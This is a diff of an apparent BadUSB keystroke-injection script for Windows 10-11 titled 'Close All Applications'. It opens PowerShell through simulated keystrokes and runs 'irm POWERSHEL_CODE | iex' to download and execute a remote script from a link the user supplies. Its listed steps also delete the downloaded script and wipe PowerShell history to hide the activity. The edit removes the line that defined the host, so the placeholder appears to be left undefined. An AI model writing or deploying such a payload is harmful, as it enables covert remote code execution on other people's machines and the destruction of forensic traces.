@@ -1,25 +1,21 @@
-REM #####################################################
-REM #                                                   |
-REM # Title        : Close All Applications             |
-REM # Author       : Aleff                              |
-REM # Version      : 1.0                                |
-REM # Category     : Execution                          |
-REM # Target       : Windows 10-11                      |
-REM #                                                   |
-REM #####################################################
+* #####################################################
+* #                                                   |
+* # Title        : Close All Applications             |
+* # Author       : Aleff                              |
+* # Version      : 1.0                                |
+* # Category     : Execution                          |
+* # Target       : Windows 10-11                      |
+* #                                                   |
+* #####################################################
 
-REM Plug-And-Play
+* Plug-And-Play
 
-REM 
-REM 1. Open a powershell
-REM 2. Download a Python script
-REM 3. Execute it
-REM 4. Remove Python script downloaded
-REM 5. Delete powershell history
-REM
+* 1. Open a powershell
+* 2. Download a Python script
+* 3. Execute it
+* 4. Remove Python script downloaded
+* 5. Delete powershell history
 
-REM Reply with YOUR LINK. The Payload should be close_all_app.ps1
-DEFINE POWERSHEL_CODE example.com
 
 DELAY 2000
 GUI x
@@ -40,5 +36,6 @@ TAB
 TAB
 ENTER
 DELAY 2000
+* Reply with YOUR LINK. The Payload should be close_all_app.ps1
 STRING irm POWERSHEL_CODE | iex
 ENTER
